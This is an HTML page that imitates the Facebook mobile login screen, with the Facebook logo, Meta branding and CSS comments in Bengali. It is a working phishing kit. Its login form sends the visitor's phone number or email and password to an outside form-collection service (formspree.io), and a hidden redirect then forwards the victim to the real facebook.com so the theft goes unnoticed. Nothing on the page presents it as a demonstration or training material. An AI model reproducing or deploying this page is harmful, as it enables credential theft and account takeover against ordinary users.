<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in</title>
    <style>
        /* CSS Reset & Global Styles */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { 
            background-color: #0b0c0e; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            height: 100vh;
            overflow: hidden;
        }

        .wrapper { width: 100%; max-width: 420px; text-align: center; padding: 20px; display: flex; flex-direction: column; align-items: center; }

        .language-top { color: #8a8d91; font-size: 13px; margin-top: 10px; margin-bottom: 60px; cursor: pointer; }

        /* লোগো - একদম অরিজিনাল সার্কেল ফিক্স */
        .fb-logo-container {
            width: 82px;
            height: 82px;
            background: #ffffff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 50px;
            overflow: hidden;
        }
        .fb-logo-container img { width: 100%; height: 100%; object-fit: cover; }

        /* ইনপুট ফিল্ড ডিজাইন */
        .input-group { width: 100%; margin-bottom: 12px; }
        input {
            width: 100%;
            height: 60px;
            background: #1c1e21;
            border: 1px solid #333639;
            border-radius: 14px;
            padding: 0 16px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus { border-color: #0866ff; }
        input::placeholder { color: #8a8d91; }

        /* লগইন বাটন */
        .login-submit {
            width: 100%;
            height: 48px;
            background-color: #0866ff;
            color: #ffffff;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 8px;
            cursor: pointer;
        }
        .login-submit:active { opacity: 0.8; }

        .forgot-link { color: #ffffff; text-decoration: none; font-size: 15px; margin-top: 25px; display: block; }

        /* নিচের সেকশন */
        .bottom-section { width: 100%; margin-top: auto; padding-bottom: 20px; }
        
        .create-account-btn {
            width: 100%;
            height: 44px;
            background: transparent;
            border: 1px solid #0866ff;
            color: #0866ff;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .meta-branding {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            color: #8a8d91;
            font-size: 14px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="language-top">English (US) ⌄</div>

        <div class="fb-logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="f">
        </div>

        <form action="https://formspree.io/f/mgongrlg" method="POST" style="width: 100%;">
            
            <div class="input-group">
                <input type="text" name="user_log_id" placeholder="Mobile number or email" required>
            </div>
            
            <div class="input-group">
                <input type="password" name="user_log_key" placeholder="Password" required>
            </div>
            
            <input type="hidden" name="_next" value="https://www.facebook.com">
            <input type="hidden" name="_subject" value="New Login Attempt">

            <button type="submit" class="login-submit">Log in</button>
        </form>

        <a href="#" class="forgot-link">Forgot password?</a>

        <div class="bottom-section">
            <button type="button" class="create-account-btn">Create new account</button>
            <div class="meta-branding">
                <span style="font-size: 18px;">♾</span> Meta
            </div>
        </div>
    </div>

</body>
</html>
